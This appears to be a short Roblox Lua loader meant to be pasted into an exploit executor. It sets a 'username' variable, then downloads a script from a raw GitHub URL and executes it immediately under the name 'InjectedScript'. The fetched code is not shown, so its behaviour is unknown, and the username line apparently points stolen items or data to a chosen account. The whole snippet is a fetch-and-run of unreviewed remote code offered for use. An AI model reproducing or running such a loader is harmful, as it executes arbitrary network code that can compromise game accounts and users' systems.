username = "stfu"

local env = {}
setmetatable(env, { __index = _G })

loadstring(game:HttpGet("https://raw.githubusercontent.com/Digitalzisthebest/Fusion/refs/heads/main/Script.lua"), "InjectedScript", "t", env)()
